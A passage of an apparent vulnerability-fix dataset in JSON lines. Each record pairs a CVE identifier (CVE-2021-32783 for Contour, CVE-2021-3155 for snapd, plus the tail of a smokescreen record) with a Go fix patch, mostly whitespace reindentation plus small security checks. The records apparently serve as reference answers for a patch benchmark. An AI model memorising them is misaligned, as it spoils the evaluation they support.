strings.Contains(domainToCheck, \"*\") {\n+                        return fmt.Errorf(\"%v: domain globs are only supported as prefix\", d)\n+                }\n+        }\n+        return nil\n }\n \n // PolicyDisabled checks if an EnforcementPolicy is disabled at the ACL level\n func (acl *ACL) PolicyDisabled(svc string, p EnforcementPolicy) error {\n-\tfor _, dp := range acl.DisabledPolicies {\n-\t\tif dp == p {\n-\t\t\treturn fmt.Errorf(\"rule for svc:%v utilizes a disabled policy:%v\", svc, p)\n-\t\t}\n-\t}\n-\treturn nil\n+        for _, dp := range acl.DisabledPolicies {\n+                if dp == p {\n+                        return fmt.Errorf(\"rule for svc:%v utilizes a disabled policy:%v\", svc, p)\n+                }\n+        }\n+        return nil\n }\n \n // Project returns the configured project for a service\n func (acl *ACL) Project(service string) (string, error) {\n-\trule := acl.Rule(service)\n-\tif rule == nil {\n-\t\treturn \"\", fmt.Errorf(\"no rule for service: %v\", service)\n-\t}\n-\treturn rule.Project, nil\n+        rule := acl.Rule(service)\n+        if rule == nil {\n+                return \"\", fmt.Errorf(\"no rule for service: %v\", service)\n+        }\n+        return rule.Project, nil\n }\n \n // Rule returns the configured rule for a service, or the default rule if none\n // is configured.\n func (acl *ACL) Rule(service string) *Rule {\n-\tif service, ok := acl.Rules[service]; ok {\n-\t\treturn &service\n-\t}\n-\treturn acl.DefaultRule\n+        if service, ok := acl.Rules[service]; ok {\n+                return &service\n+        }\n+        return acl.DefaultRule\n }\n \n func hostMatchesGlob(host string, domainGlob string) bool {\n-\tif domainGlob != \"\" && domainGlob[0] == '*' {\n-\t\tsuffix := domainGlob[1:]\n-\t\tif strings.HasSuffix(host, suffix) {\n-\t\t\treturn true\n-\t\t}\n-\t} else if domainGlob == host {\n-\t\treturn true\n-\t}\n-\treturn false\n+// Smokescreen should operate on DNS names, which are case-insensitive.\n+// We also normalize FQDNs by removing the trailing dot.\n+host = strings.ToLower(strings.TrimSuffix(host, \".\"))\n+domainGlob = strings.ToLower(domainGlob)\n+\n+        if domainGlob != \"\" && domainGlob[0] == '*' {\n+                suffix := domainGlob[1:]\n+                if strings.HasSuffix(host, suffix) {\n+                        return true\n+                }\n+        } else if domainGlob == host {\n+                return true\n+        }\n+        return false\n }\n"}
{"cve":"CVE-2021-32783:0708", "fix_patch": "diff --git a/internal/dag/accessors.go b/internal/dag/accessors.go\nindex 9f61e412..75acaf3e 100644\n--- a/internal/dag/accessors.go\n+++ b/internal/dag/accessors.go\n@@ -14,84 +14,90 @@\n package dag\n \n import (\n-\t\"fmt\"\n-\t\"strconv\"\n-\n-\t\"github.com/projectcontour/contour/internal/annotation\"\n-\t\"github.com/projectcontour/contour/internal/k8s\"\n-\tv1 \"k8s.io/api/core/v1\"\n-\t\"k8s.io/apimachinery/pkg/types\"\n-\t\"k8s.io/apimachinery/pkg/util/intstr\"\n+        \"fmt\"\n+        \"strconv\"\n+\n+        \"github.com/projectcontour/contour/internal/annotation\"\n+        \"github.com/projectcontour/contour/internal/k8s\"\n+        v1 \"k8s.io/api/core/v1\"\n+        \"k8s.io/apimachinery/pkg/types\"\n+        \"k8s.io/apimachinery/pkg/util/intstr\"\n )\n \n // RouteServiceName identifies a service used in a route.\n type RouteServiceName struct {\n-\tName      string\n-\tNamespace string\n-\tPort      int32\n+        Name      string\n+        Namespace string\n+        Port      int32\n }\n \n // GetServices returns all services in the DAG.\n func (dag *DAG) GetServices() map[RouteServiceName]*Service {\n-\tgetter := serviceGetter(map[RouteServiceName]*Service{})\n-\tdag.Visit(getter.visit)\n-\treturn getter\n+        getter := serviceGetter(map[RouteServiceName]*Service{})\n+        dag.Visit(getter.visit)\n+        return getter\n }\n \n // GetService returns the service in the DAG that matches the provided\n // namespace, name and port, or nil if no matching service is found.\n func (dag *DAG) GetService(meta types.NamespacedName, port int32) *Service {\n-\treturn dag.GetServices()[RouteServiceName{\n-\t\tName:      meta.Name,\n-\t\tNamespace: meta.Namespace,\n-\t\tPort:      port,\n-\t}]\n+        return dag.GetServices()[RouteServiceName{\n+                Name:      meta.Name,\n+                Namespace: meta.Namespace,\n+                Port:      port,\n+        }]\n }\n \n // EnsureService looks for a Kubernetes service in the cache matching the provided\n // namespace, name and port, and returns a DAG service for it. If a matching service\n // cannot be found in the cache, an error is returned.\n func (dag *DAG) EnsureService(meta types.NamespacedName, port intstr.IntOrString, cache *KubernetesCache) (*Service, error) {\n-\tsvc, svcPort, err := cache.LookupService(meta, port)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif dagSvc := dag.GetService(k8s.NamespacedNameOf(svc), svcPort.Port); dagSvc != nil {\n-\t\treturn dagSvc, nil\n-\t}\n-\n-\tdagSvc := &Service{\n-\t\tWeighted: WeightedService{\n-\t\t\tServiceName:      svc.Name,\n-\t\t\tServiceNamespace: svc.Namespace,\n-\t\t\tServicePort:      svcPort,\n-\t\t\tWeight:           1,\n-\t\t},\n-\t\tProtocol:           upstreamProtocol(svc, svcPort),\n-\t\tMaxConnections:     annotation.MaxConnections(svc),\n-\t\tMaxPendingRequests: annotation.MaxPendingRequests(svc),\n-\t\tMaxRequests:        annotation.MaxRequests(svc),\n-\t\tMaxRetries:         annotation.MaxRetries(svc),\n-\t\tExternalName:       externalName(svc),\n-\t}\n-\treturn dagSvc, nil\n+svc, svcPort, err := cache.LookupService(meta, port)\n+if err != nil {\n+return nil, err\n+}\n+\n+if dagSvc := dag.GetService(k8s.NamespacedNameOf(svc), svcPort.Port); dagSvc != nil {\n+return dagSvc, nil\n+}\n+\n+en := externalName(svc)\n+switch en {\n+case \"localhost\", \"127.0.0.1\", \"::1\":\n+return nil, fmt.Errorf(\"service %q of type ExternalName must not point to localhost\", meta)\n+}\n+\n+dagSvc := &Service{\n+Weighted: WeightedService{\n+ServiceName:      svc.Name,\n+ServiceNamespace: svc.Namespace,\n+ServicePort:      svcPort,\n+Weight:           1,\n+},\n+Protocol:           upstreamProtocol(svc, svcPort),\n+MaxConnections:     annotation.MaxConnections(svc),\n+MaxPendingRequests: annotation.MaxPendingRequests(svc),\n+MaxRequests:        annotation.MaxRequests(svc),\n+MaxRetries:         annotation.MaxRetries(svc),\n+ExternalName:       en,\n+}\n+return dagSvc, nil\n }\n \n func upstreamProtocol(svc *v1.Service, port v1.ServicePort) string {\n-\tup := annotation.ParseUpstreamProtocols(svc.Annotations)\n-\tprotocol := up[port.Name]\n-\tif protocol == \"\" {\n-\t\tprotocol = up[strconv.Itoa(int(port.Port))]\n-\t}\n-\treturn protocol\n+        up := annotation.ParseUpstreamProtocols(svc.Annotations)\n+        protocol := up[port.Name]\n+        if protocol == \"\" {\n+                protocol = up[strconv.Itoa(int(port.Port))]\n+        }\n+        return protocol\n }\n \n func externalName(svc *v1.Service) string {\n-\tif svc.Spec.Type != v1.ServiceTypeExternalName {\n-\t\treturn \"\"\n-\t}\n-\treturn svc.Spec.ExternalName\n+        if svc.Spec.Type != v1.ServiceTypeExternalName {\n+                return \"\"\n+        }\n+        return svc.Spec.ExternalName\n }\n \n // serviceGetter is a visitor that gets all services\n@@ -99,47 +105,47 @@ func externalName(svc *v1.Service) string {\n type serviceGetter map[RouteServiceName]*Service\n \n func (s serviceGetter) visit(vertex Vertex) {\n-\tswitch obj := vertex.(type) {\n-\tcase *Service:\n-\t\ts[RouteServiceName{\n-\t\t\tName:      obj.Weighted.ServiceName,\n-\t\t\tNamespace: obj.Weighted.ServiceNamespace,\n-\t\t\tPort:      obj.Weighted.ServicePort.Port,\n-\t\t}] = obj\n-\tdefault:\n-\t\tvertex.Visit(s.visit)\n-\t}\n+        switch obj := vertex.(type) {\n+        case *Service:\n+                s[RouteServiceName{\n+                        Name:      obj.Weighted.ServiceName,\n+                        Namespace: obj.Weighted.ServiceNamespace,\n+                        Port:      obj.Weighted.ServicePort.Port,\n+                }] = obj\n+        default:\n+                vertex.Visit(s.visit)\n+        }\n }\n \n // GetSecureVirtualHosts returns all secure virtual hosts in the DAG.\n func (dag *DAG) GetSecureVirtualHosts() map[ListenerName]*SecureVirtualHost {\n-\tgetter := svhostGetter(map[ListenerName]*SecureVirtualHost{})\n-\tdag.Visit(getter.visit)\n-\treturn getter\n+        getter := svhostGetter(map[ListenerName]*SecureVirtualHost{})\n+        dag.Visit(getter.visit)\n+        return getter\n }\n \n // GetSecureVirtualHost returns the secure virtual host in the DAG that\n // matches the provided name, or nil if no matching secure virtual host\n // is found.\n func (dag *DAG) GetSecureVirtualHost(ln ListenerName) *SecureVirtualHost {\n-\treturn dag.GetSecureVirtualHosts()[ln]\n+        return dag.GetSecureVirtualHosts()[ln]\n }\n \n // EnsureSecureVirtualHost adds a secure virtual host with the provided\n // name to the DAG if it does not already exist, and returns it.\n func (dag *DAG) EnsureSecureVirtualHost(ln ListenerName) *SecureVirtualHost {\n-\tif svh := dag.GetSecureVirtualHost(ln); svh != nil {\n-\t\treturn svh\n-\t}\n+        if svh := dag.GetSecureVirtualHost(ln); svh != nil {\n+                return svh\n+        }\n \n-\tsvh := &SecureVirtualHost{\n-\t\tVirtualHost: VirtualHost{\n-\t\t\tName:         ln.Name,\n-\t\t\tListenerName: ln.ListenerName,\n-\t\t},\n-\t}\n-\tdag.AddRoot(svh)\n-\treturn svh\n+        svh := &SecureVirtualHost{\n+                VirtualHost: VirtualHost{\n+                        Name:         ln.Name,\n+                        ListenerName: ln.ListenerName,\n+                },\n+        }\n+        dag.AddRoot(svh)\n+        return svh\n }\n \n // svhostGetter is a visitor that gets all secure virtual hosts\n@@ -147,40 +153,40 @@ func (dag *DAG) EnsureSecureVirtualHost(ln ListenerName) *SecureVirtualHost {\n type svhostGetter map[ListenerName]*SecureVirtualHost\n \n func (s svhostGetter) visit(vertex Vertex) {\n-\tswitch obj := vertex.(type) {\n-\tcase *SecureVirtualHost:\n-\t\ts[ListenerName{Name: obj.Name, ListenerName: obj.VirtualHost.ListenerName}] = obj\n-\tdefault:\n-\t\tvertex.Visit(s.visit)\n-\t}\n+        switch obj := vertex.(type) {\n+        case *SecureVirtualHost:\n+                s[ListenerName{Name: obj.Name, ListenerName: obj.VirtualHost.ListenerName}] = obj\n+        default:\n+                vertex.Visit(s.visit)\n+        }\n }\n \n // GetVirtualHosts returns all virtual hosts in the DAG.\n func (dag *DAG) GetVirtualHosts() map[ListenerName]*VirtualHost {\n-\tgetter := vhostGetter(map[ListenerName]*VirtualHost{})\n-\tdag.Visit(getter.visit)\n-\treturn getter\n+        getter := vhostGetter(map[ListenerName]*VirtualHost{})\n+        dag.Visit(getter.visit)\n+        return getter\n }\n \n // GetVirtualHost returns the virtual host in the DAG that matches the\n // provided name, or nil if no matching virtual host is found.\n func (dag *DAG) GetVirtualHost(ln ListenerName) *VirtualHost {\n-\treturn dag.GetVirtualHosts()[ln]\n+        return dag.GetVirtualHosts()[ln]\n }\n \n // EnsureVirtualHost adds a virtual host with the provided name to the\n // DAG if it does not already exist, and returns it.\n func (dag *DAG) EnsureVirtualHost(ln ListenerName) *VirtualHost {\n-\tif vhost := dag.GetVirtualHost(ln); vhost != nil {\n-\t\treturn vhost\n-\t}\n+        if vhost := dag.GetVirtualHost(ln); vhost != nil {\n+                return vhost\n+        }\n \n-\tvhost := &VirtualHost{\n-\t\tName:         ln.Name,\n-\t\tListenerName: ln.ListenerName,\n-\t}\n-\tdag.AddRoot(vhost)\n-\treturn vhost\n+        vhost := &VirtualHost{\n+                Name:         ln.Name,\n+                ListenerName: ln.ListenerName,\n+        }\n+        dag.AddRoot(vhost)\n+        return vhost\n }\n \n // vhostGetter is a visitor that gets all virtual hosts\n@@ -188,26 +194,26 @@ func (dag *DAG) EnsureVirtualHost(ln ListenerName) *VirtualHost {\n type vhostGetter map[ListenerName]*VirtualHost\n \n func (v vhostGetter) visit(vertex Vertex) {\n-\tswitch obj := vertex.(type) {\n-\tcase *VirtualHost:\n-\t\tv[ListenerName{Name: obj.Name, ListenerName: obj.ListenerName}] = obj\n-\tdefault:\n-\t\tvertex.Visit(v.visit)\n-\t}\n+        switch obj := vertex.(type) {\n+        case *VirtualHost:\n+                v[ListenerName{Name: obj.Name, ListenerName: obj.ListenerName}] = obj\n+        default:\n+                vertex.Visit(v.visit)\n+        }\n }\n \n // GetExtensionClusters returns all extension clusters in the DAG.\n func (dag *DAG) GetExtensionClusters() map[string]*ExtensionCluster {\n-\tgetter := extensionClusterGetter(map[string]*ExtensionCluster{})\n-\tdag.Visit(getter.visit)\n-\treturn getter\n+        getter := extensionClusterGetter(map[string]*ExtensionCluster{})\n+        dag.Visit(getter.visit)\n+        return getter\n }\n \n // GetExtensionCluster returns the extension cluster in the DAG that\n // matches the provided name, or nil if no matching extension cluster\n //is found.\n func (dag *DAG) GetExtensionCluster(name string) *ExtensionCluster {\n-\treturn dag.GetExtensionClusters()[name]\n+        return dag.GetExtensionClusters()[name]\n }\n \n // extensionClusterGetter is a visitor that gets all extension clusters\n@@ -215,27 +221,27 @@ func (dag *DAG) GetExtensionCluster(name string) *ExtensionCluster {\n type extensionClusterGetter map[string]*ExtensionCluster\n \n func (v extensionClusterGetter) visit(vertex Vertex) {\n-\tswitch obj := vertex.(type) {\n-\tcase *ExtensionCluster:\n-\t\tv[obj.Name] = obj\n-\tdefault:\n-\t\tvertex.Visit(v.visit)\n-\t}\n+        switch obj := vertex.(type) {\n+        case *ExtensionCluster:\n+                v[obj.Name] = obj\n+        default:\n+                vertex.Visit(v.visit)\n+        }\n }\n \n // validSecret returns true if the Secret contains certificate and private key material.\n func validSecret(s *v1.Secret) error {\n-\tif s.Type != v1.SecretTypeTLS {\n-\t\treturn fmt.Errorf(\"Secret type is not %q\", v1.SecretTypeTLS)\n-\t}\n+        if s.Type != v1.SecretTypeTLS {\n+                return fmt.Errorf(\"Secret type is not %q\", v1.SecretTypeTLS)\n+        }\n \n-\tif len(s.Data[v1.TLSCertKey]) == 0 {\n-\t\treturn fmt.Errorf(\"empty %q key\", v1.TLSCertKey)\n-\t}\n+        if len(s.Data[v1.TLSCertKey]) == 0 {\n+                return fmt.Errorf(\"empty %q key\", v1.TLSCertKey)\n+        }\n \n-\tif len(s.Data[v1.TLSPrivateKeyKey]) == 0 {\n-\t\treturn fmt.Errorf(\"empty %q key\", v1.TLSPrivateKeyKey)\n-\t}\n+        if len(s.Data[v1.TLSPrivateKeyKey]) == 0 {\n+                return fmt.Errorf(\"empty %q key\", v1.TLSPrivateKeyKey)\n+        }\n \n-\treturn nil\n+        return nil\n }\n"}
{"cve":"CVE-2021-3155:0708", "fix_patch": "diff --git a/cmd/snap/cmd_run.go b/cmd/snap/cmd_run.go\nindex 2895a336ab..2c9edbe00a 100644\n--- a/cmd/snap/cmd_run.go\n+++ b/cmd/snap/cmd_run.go\n@@ -20,506 +20,506 @@\n package main\n \n import (\n-\t\"bufio\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"io/ioutil\"\n-\t\"net\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"os/user\"\n-\t\"path/filepath\"\n-\t\"regexp\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"syscall\"\n-\t\"time\"\n-\n-\t\"github.com/godbus/dbus\"\n-\t\"github.com/jessevdk/go-flags\"\n-\n-\t\"github.com/snapcore/snapd/client\"\n-\t\"github.com/snapcore/snapd/desktop/portal\"\n-\t\"github.com/snapcore/snapd/dirs\"\n-\t\"github.com/snapcore/snapd/features\"\n-\t\"github.com/snapcore/snapd/i18n\"\n-\t\"github.com/snapcore/snapd/interfaces\"\n-\t\"github.com/snapcore/snapd/logger\"\n-\t\"github.com/snapcore/snapd/osutil\"\n-\t\"github.com/snapcore/snapd/osutil/strace\"\n-\t\"github.com/snapcore/snapd/sandbox/cgroup\"\n-\t\"github.com/snapcore/snapd/sandbox/selinux\"\n-\t\"github.com/snapcore/snapd/snap\"\n-\t\"github.com/snapcore/snapd/snap/snapenv\"\n-\t\"github.com/snapcore/snapd/strutil/shlex\"\n-\t\"github.com/snapcore/snapd/timeutil\"\n-\t\"github.com/snapcore/snapd/x11\"\n+        \"bufio\"\n+        \"fmt\"\n+        \"io\"\n+        \"io/ioutil\"\n+        \"net\"\n+        \"os\"\n+        \"os/exec\"\n+        \"os/user\"\n+        \"path/filepath\"\n+        \"regexp\"\n+        \"strconv\"\n+        \"strings\"\n+        \"syscall\"\n+        \"time\"\n+\n+        \"github.com/godbus/dbus\"\n+        \"github.com/jessevdk/go-flags\"\n+\n+        \"github.com/snapcore/snapd/client\"\n+        \"github.com/snapcore/snapd/desktop/portal\"\n+        \"github.com/snapcore/snapd/dirs\"\n+        \"github.com/snapcore/snapd/features\"\n+        \"github.com/snapcore/snapd/i18n\"\n+        \"github.com/snapcore/snapd/interfaces\"\n+        \"github.com/snapcore/snapd/logger\"\n+        \"github.com/snapcore/snapd/osutil\"\n+        \"github.com/snapcore/snapd/osutil/strace\"\n+        \"github.com/snapcore/snapd/sandbox/cgroup\"\n+        \"github.com/snapcore/snapd/sandbox/selinux\"\n+        \"github.com/snapcore/snapd/snap\"\n+        \"github.com/snapcore/snapd/snap/snapenv\"\n+        \"github.com/snapcore/snapd/strutil/shlex\"\n+        \"github.com/snapcore/snapd/timeutil\"\n+        \"github.com/snapcore/snapd/x11\"\n )\n \n var (\n-\tsyscallExec              = syscall.Exec\n-\tuserCurrent              = user.Current\n-\tosGetenv                 = os.Getenv\n-\ttimeNow                  = time.Now\n-\tselinuxIsEnabled         = selinux.IsEnabled\n-\tselinuxVerifyPathContext = selinux.VerifyPathContext\n-\tselinuxRestoreContext    = selinux.RestoreContext\n+        syscallExec              = syscall.Exec\n+        userCurrent              = user.Current\n+        osGetenv                 = os.Getenv\n+        timeNow                  = time.Now\n+        selinuxIsEnabled         = selinux.IsEnabled\n+        selinuxVerifyPathContext = selinux.VerifyPathContext\n+        selinuxRestoreContext    = selinux.RestoreContext\n )\n \n type cmdRun struct {\n-\tclientMixin\n-\tCommand  string `long:\"command\" hidden:\"yes\"`\n-\tHookName string `long:\"hook\" hidden:\"yes\"`\n-\tRevision string `short:\"r\" default:\"unset\" hidden:\"yes\"`\n-\tShell    bool   `long:\"shell\" `\n-\n-\t// This options is both a selector (use or don't use strace) and it\n-\t// can also carry extra options for strace. This is why there is\n-\t// \"default\" and \"optional-value\" to distinguish this.\n-\tStrace string `long:\"strace\" optional:\"true\" optional-value:\"with-strace\" default:\"no-strace\" default-mask:\"-\"`\n-\t// deprecated in favor of Gdbserver\n-\tGdb                   bool   `long:\"gdb\" hidden:\"yes\"`\n-\tGdbserver             string `long:\"gdbserver\" default:\"no-gdbserver\" optional-value:\":0\" optional:\"true\"`\n-\tExperimentalGdbserver string `long:\"experimental-gdbserver\" default:\"no-gdbserver\" optional-value:\":0\" optional:\"true\" hidden:\"yes\"`\n-\tTraceExec             bool   `long:\"trace-exec\"`\n-\n-\t// not a real option, used to check if cmdRun is initialized by\n-\t// the parser\n-\tParserRan int    `long:\"parser-ran\" default:\"1\" hidden:\"yes\"`\n-\tTimer     string `long:\"timer\" hidden:\"yes\"`\n+        clientMixin\n+        Command  string `long:\"command\" hidden:\"yes\"`\n+        HookName string `long:\"hook\" hidden:\"yes\"`\n+        Revision string `short:\"r\" default:\"unset\" hidden:\"yes\"`\n+        Shell    bool   `long:\"shell\" `\n+\n+        // This options is both a selector (use or don't use strace) and it\n+        // can also carry extra options for strace. This is why there is\n+        // \"default\" and \"optional-value\" to distinguish this.\n+        Strace string `long:\"strace\" optional:\"true\" optional-value:\"with-strace\" default:\"no-strace\" default-mask:\"-\"`\n+        // deprecated in favor of Gdbserver\n+        Gdb                   bool   `long:\"gdb\" hidden:\"yes\"`\n+        Gdbserver             string `long:\"gdbserver\" default:\"no-gdbserver\" optional-value:\":0\" optional:\"true\"`\n+        ExperimentalGdbserver string `long:\"experimental-gdbserver\" default:\"no-gdbserver\" optional-value:\":0\" optional:\"true\" hidden:\"yes\"`\n+        TraceExec             bool   `long:\"trace-exec\"`\n+\n+        // not a real option, used to check if cmdRun is initialized by\n+        // the parser\n+        ParserRan int    `long:\"parser-ran\" default:\"1\" hidden:\"yes\"`\n+        Timer     string `long:\"timer\" hidden:\"yes\"`\n }\n \n func init() {\n-\taddCommand(\"run\",\n-\t\ti18n.G(\"Run the given snap command\"),\n-\t\ti18n.G(`\n+        addCommand(\"run\",\n+                i18n.G(\"Run the given snap command\"),\n+                i18n.G(`\n The run command executes the given snap command with the right confinement\n and environment.\n `),\n-\t\tfunc() flags.Commander {\n-\t\t\treturn &cmdRun{}\n-\t\t}, map[string]string{\n-\t\t\t// TRANSLATORS: This should not start with a lowercase letter.\n-\t\t\t\"command\": i18n.G(\"Alternative command to run\"),\n-\t\t\t// TRANSLATORS: This should not start with a lowercase letter.\n-\t\t\t\"hook\": i18n.G(\"Hook to run\"),\n-\t\t\t// TRANSLATORS: This should not start with a lowercase letter.\n-\t\t\t\"r\": i18n.G(\"Use a specific snap revision when running hook\"),\n-\t\t\t// TRANSLATORS: This should not start with a lowercase letter.\n-\t\t\t\"shell\": i18n.G(\"Run a shell instead of the command (useful for debugging)\"),\n-\t\t\t// TRANSLATORS: This should not start with a lowercase letter.\n-\t\t\t\"strace\": i18n.G(\"Run the command under strace (useful for debugging). Extra strace options can be specified as well here. Pass --raw to strace early snap helpers.\"),\n-\t\t\t// TRANSLATORS: This should not start with a lowercase letter.\n-\t\t\t\"gdb\": i18n.G(\"Run the command with gdb (deprecated, use --gdbserver instead)\"),\n-\t\t\t// TRANSLATORS: This should not start with a lowercase letter.\n-\t\t\t\"gdbserver\":              i18n.G(\"Run the command with gdbserver\"),\n-\t\t\t\"experimental-gdbserver\": \"\",\n-\t\t\t// TRANSLATORS: This should not start with a lowercase letter.\n-\t\t\t\"timer\": i18n.G(\"Run as a timer service with given schedule\"),\n-\t\t\t// TRANSLATORS: This should not start with a lowercase letter.\n-\t\t\t\"trace-exec\": i18n.G(\"Display exec calls timing data\"),\n-\t\t\t\"parser-ran\": \"\",\n-\t\t}, nil)\n+                func() flags.Commander {\n+                        return &cmdRun{}\n+                }, map[string]string{\n+                        // TRANSLATORS: This should not start with a lowercase letter.\n+                        \"command\": i18n.G(\"Alternative command to run\"),\n+                        // TRANSLATORS: This should not start with a lowercase letter.\n+                        \"hook\": i18n.G(\"Hook to run\"),\n+                        // TRANSLATORS: This should not start with a lowercase letter.\n+                        \"r\": i18n.G(\"Use a specific snap revision when running hook\"),\n+                        // TRANSLATORS: This should not start with a lowercase letter.\n+                        \"shell\": i18n.G(\"Run a shell instead of the command (useful for debugging)\"),\n+                        // TRANSLATORS: This should not start with a lowercase letter.\n+                        \"strace\": i18n.G(\"Run the command under strace (useful for debugging). Extra strace options can be specified as well here. Pass --raw to strace early snap helpers.\"),\n+                        // TRANSLATORS: This should not start with a lowercase letter.\n+                        \"gdb\": i18n.G(\"Run the command with gdb (deprecated, use --gdbserver instead)\"),\n+                        // TRANSLATORS: This should not start with a lowercase letter.\n+                        \"gdbserver\":              i18n.G(\"Run the command with gdbserver\"),\n+                        \"experimental-gdbserver\": \"\",\n+                        // TRANSLATORS: This should not start with a lowercase letter.\n+                        \"timer\": i18n.G(\"Run as a timer service with given schedule\"),\n+                        // TRANSLATORS: This should not start with a lowercase letter.\n+                        \"trace-exec\": i18n.G(\"Display exec calls timing data\"),\n+                        \"parser-ran\": \"\",\n+                }, nil)\n }\n \n // isStopping returns true if the system is shutting down.\n func isStopping() (bool, error) {\n-\t// Make sure, just in case, that systemd doesn't localize the output string.\n-\tenv, err := osutil.OSEnvironment()\n-\tif err != nil {\n-\t\treturn false, err\n-\t}\n-\tenv[\"LC_MESSAGES\"] = \"C\"\n-\t// Check if systemd is stopping (shutting down or rebooting).\n-\tcmd := exec.Command(\"systemctl\", \"is-system-running\")\n-\tcmd.Env = env.ForExec()\n-\tstdout, err := cmd.Output()\n-\t// systemctl is-system-running returns non-zero for outcomes other than \"running\"\n-\t// As such, ignore any ExitError and just process the stdout buffer.\n-\tif _, ok := err.(*exec.ExitError); ok {\n-\t\treturn string(stdout) == \"stopping\\n\", nil\n-\t}\n-\treturn false, err\n+        // Make sure, just in case, that systemd doesn't localize the output string.\n+        env, err := osutil.OSEnvironment()\n+        if err != nil {\n+                return false, err\n+        }\n+        env[\"LC_MESSAGES\"] = \"C\"\n+        // Check if systemd is stopping (shutting down or rebooting).\n+        cmd := exec.Command(\"systemctl\", \"is-system-running\")\n+        cmd.Env = env.ForExec()\n+        stdout, err := cmd.Output()\n+        // systemctl is-system-running returns non-zero for outcomes other than \"running\"\n+        // As such, ignore any ExitError and just process the stdout buffer.\n+        if _, ok := err.(*exec.ExitError); ok {\n+                return string(stdout) == \"stopping\\n\", nil\n+        }\n+        return false, err\n }\n \n func maybeWaitForSecurityProfileRegeneration(cli *client.Client) error {\n-\t// check if the security profiles key has changed, if so, we need\n-\t// to wait for snapd to re-generate all profiles\n-\tmismatch, err := interfaces.SystemKeyMismatch()\n-\tif err == nil && !mismatch {\n-\t\treturn nil\n-\t}\n-\t// something went wrong with the system-key compare, try to\n-\t// reach snapd before continuing\n-\tif err != nil {\n-\t\tlogger.Debugf(\"SystemKeyMismatch returned an error: %v\", err)\n-\t}\n-\n-\t// We have a mismatch but maybe it is only because systemd is shutting down\n-\t// and core or snapd were already unmounted and we failed to re-execute.\n-\t// For context see: https://bugs.launchpad.net/snapd/+bug/1871652\n-\tstopping, err := isStopping()\n-\tif err != nil {\n-\t\tlogger.Debugf(\"cannot check if system is stopping: %s\", err)\n-\t}\n-\tif stopping {\n-\t\tlogger.Debugf(\"ignoring system key mismatch during system shutdown/reboot\")\n-\t\treturn nil\n-\t}\n-\n-\t// We have a mismatch, try to connect to snapd, once we can\n-\t// connect we just continue because that usually means that\n-\t// a new snapd is ready and has generated profiles.\n-\t//\n-\t// There is a corner case if an upgrade leaves the old snapd\n-\t// running and we connect to the old snapd. Handling this\n-\t// correctly is tricky because our \"snap run\" pipeline may\n-\t// depend on profiles written by the new snapd. So for now we\n-\t// just continue and hope for the best. The real fix for this\n-\t// is to fix the packaging so that snapd is stopped, upgraded\n-\t// and started.\n-\t//\n-\t// connect timeout for client is 5s on each try, so 12*5s = 60s\n-\ttimeout := 12\n-\tif timeoutEnv := os.Getenv(\"SNAPD_DEBUG_SYSTEM_KEY_RETRY\"); timeoutEnv != \"\" {\n-\t\tif i, err := strconv.Atoi(timeoutEnv); err == nil {\n-\t\t\ttimeout = i\n-\t\t}\n-\t}\n-\n-\tlogger.Debugf(\"system key mismatch detected, waiting for snapd to start responding...\")\n-\n-\tfor i := 0; i < timeout; i++ {\n-\t\t// TODO: we could also check cli.Maintenance() here too in case snapd is\n-\t\t// down semi-permanently for a refresh, but what message do we show to\n-\t\t// the user or what do we do if we know snapd is down for maintenance?\n-\t\tif _, err := cli.SysInfo(); err == nil {\n-\t\t\treturn nil\n-\t\t}\n-\t\t// sleep a little bit for good measure\n-\t\ttime.Sleep(1 * time.Second)\n-\t}\n-\n-\treturn fmt.Errorf(\"timeout waiting for snap system profiles to get updated\")\n+        // check if the security profiles key has changed, if so, we need\n+        // to wait for snapd to re-generate all profiles\n+        mismatch, err := interfaces.SystemKeyMismatch()\n+        if err == nil && !mismatch {\n+                return nil\n+        }\n+        // something went wrong with the system-key compare, try to\n+        // reach snapd before continuing\n+        if err != nil {\n+                logger.Debugf(\"SystemKeyMismatch returned an error: %v\", err)\n+        }\n+\n+        // We have a mismatch but maybe it is only because systemd is shutting down\n+        // and core or snapd were already unmounted and we failed to re-execute.\n+        // For context see: https://bugs.launchpad.net/snapd/+bug/1871652\n+        stopping, err := isStopping()\n+        if err != nil {\n+                logger.Debugf(\"cannot check if system is stopping: %s\", err)\n+        }\n+        if stopping {\n+                logger.Debugf(\"ignoring system key mismatch during system shutdown/reboot\")\n+                return nil\n+        }\n+\n+        // We have a mismatch, try to connect to snapd, once we can\n+        // connect we just continue because that usually means that\n+        // a new snapd is ready and has generated profiles.\n+        //\n+        // There is a corner case if an upgrade leaves the old snapd\n+        // running and we connect to the old snapd. Handling this\n+        // correctly is tricky because our \"snap run\" pipeline may\n+        // depend on profiles written by the new snapd. So for now we\n+        // just continue and hope for the best. The real fix for this\n+        // is to fix the packaging so that snapd is stopped, upgraded\n+        // and started.\n+        //\n+        // connect timeout for client is 5s on each try, so 12*5s = 60s\n+        timeout := 12\n+        if timeoutEnv := os.Getenv(\"SNAPD_DEBUG_SYSTEM_KEY_RETRY\"); timeoutEnv != \"\" {\n+                if i, err := strconv.Atoi(timeoutEnv); err == nil {\n+                        timeout = i\n+                }\n+        }\n+\n+        logger.Debugf(\"system key mismatch detected, waiting for snapd to start responding...\")\n+\n+        for i := 0; i < timeout; i++ {\n+                // TODO: we could also check cli.Maintenance() here too in case snapd is\n+                // down semi-permanently for a refresh, but what message do we show to\n+                // the user or what do we do if we know snapd is down for maintenance?\n+                if _, err := cli.SysInfo(); err == nil {\n+                        return nil\n+                }\n+                // sleep a little bit for good measure\n+                time.Sleep(1 * time.Second)\n+        }\n+\n+        return fmt.Errorf(\"timeout waiting for snap system profiles to get updated\")\n }\n \n func (x *cmdRun) Usage() string {\n-\treturn \"[run-OPTIONS] <NAME-OF-SNAP>.<NAME-OF-APP> [<SNAP-APP-ARG>...]\"\n+        return \"[run-OPTIONS] <NAME-OF-SNAP>.<NAME-OF-APP> [<SNAP-APP-ARG>...]\"\n }\n \n func (x *cmdRun) Execute(args []string) error {\n-\tif len(args) == 0 {\n-\t\treturn fmt.Errorf(i18n.G(\"need the application to run as argument\"))\n-\t}\n-\tsnapApp := args[0]\n-\targs = args[1:]\n-\n-\t// Catch some invalid parameter combinations, provide helpful errors\n-\toptionsSet := 0\n-\tfor _, param := range []string{x.HookName, x.Command, x.Timer} {\n-\t\tif param != \"\" 